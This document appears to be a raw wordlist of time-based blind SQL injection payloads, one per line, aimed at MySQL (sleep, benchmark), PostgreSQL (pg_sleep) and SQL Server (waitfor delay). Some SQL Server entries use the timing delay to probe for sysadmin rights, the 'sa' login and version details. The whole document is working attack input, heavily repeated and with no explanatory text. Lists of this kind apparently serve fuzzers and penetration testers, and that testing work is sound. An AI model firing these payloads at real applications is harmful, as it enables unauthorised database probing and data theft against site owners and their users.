+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1"  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  "cneo" like "cneo
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+"   )    )   ;waitfor delay '0:0:__TIME__'--
+or sleep  (  __TIME__  )    =  '
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+, if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+, if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1" where 7739  =  7739 and sleep  (  5  )  --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+"   )    )   ;waitfor delay '0:0:__TIME__'--
+or sleep  (  __TIME__  )    =  '
+1   )    )    or pg_sleep  (  __TIME__  )  --
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+ )    )   ,waitfor delay '0:0:__TIME__'--
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+ )    )   ,waitfor delay '0:0:__TIME__'--
+" or sleep  (  __TIME__  )  #
+" or pg_sleep  (  __TIME__  )  --
+1"   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+ )   or sleep  (  __TIME__  )    =  '
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+"   )    )    or pg_sleep  (  __TIME__  )  --
+1  )   or sleep  (  __TIME__  )  #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1'  )   rlike sleep  (  5  )  #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1" or elt  (  6272  =  6272,sleep  (  5   )    )   
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+pg_sleep  (  __TIME__  )  --
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1%" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1" where 7739  =  7739 and sleep  (  5  )  --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+a' waitfor delay '0:0:10'--
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1 or pg_sleep  (  __TIME__  )  --
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) 
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+1'   )    )    as bedq where 8781  =  8781 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --
+1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+, if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+or sleep  (  __TIME__  )  #
+" or pg_sleep  (  __TIME__  )  --
+1  )   or sleep  (  __TIME__  )  #
+1"   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+1%" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+,waitfor delay '0:0:__TIME__'--
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+or sleep  (  __TIME__  )  #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+1'  )   rlike sleep  (  5  )  #
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1 or pg_sleep  (  __TIME__  )  --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+1  )   or sleep  (  __TIME__  )  #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+or sleep  (  __TIME__  )  #
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or pg_sleep  (  __TIME__  )  --
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1'  )   rlike sleep  (  5  )  #
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+, if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1" where 7739  =  7739 and sleep  (  5  )  --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'
+, if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --
+or sleep  (  __TIME__  )  #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+1"   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+" or sleep  (  __TIME__  )    =  "
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+1   )    )    or sleep  (  __TIME__  )  #
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'  )   rlike sleep  (  5  )  #
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+1" or elt  (  6272  =  6272,sleep  (  5   )    )   
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1" where 7739  =  7739 and sleep  (  5  )  --
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+a' waitfor delay '0:0:10'--
+ )    )    or sleep  (  __TIME__  )    =  '
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+ )    )   ,waitfor delay '0:0:__TIME__'--
+; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 8  )   waitfor delay '0:0:2' --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+, if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --
+1 or pg_sleep  (  __TIME__  )  --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1'  )   rlike sleep  (  5  )  #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or pg_sleep  (  __TIME__  )  --
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+1'  )   rlike sleep  (  5  )  #
+ )    )    or pg_sleep  (  __TIME__  )  --
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+1'  )   rlike sleep  (  5  )  #
+1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) 
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1" or elt  (  6272  =  6272,sleep  (  5   )    )   
+1" or elt  (  6272  =  6272,sleep  (  5   )    )   
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1"   )    )    as klie where 2840  =  2840 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or sleep  (  __TIME__  )  #
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or pg_sleep  (  __TIME__  )  --
+1" where 7739  =  7739 and sleep  (  5  )  --
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+1   )    )    or sleep  (  __TIME__  )  #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #
+"   )    )   ;waitfor delay '0:0:__TIME__'--
+, if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+or sleep  (  __TIME__  )    =  '
+" or sleep  (  __TIME__  )    =  "
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1"   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --
+a' waitfor delay '0:0:10'--
+, if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --
+1  )   or sleep  (  __TIME__  )  #
+1   )    )    or pg_sleep  (  __TIME__  )  --
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+, if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or sleep  (  __TIME__  )  #
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   or sleep  (  __TIME__  )  #
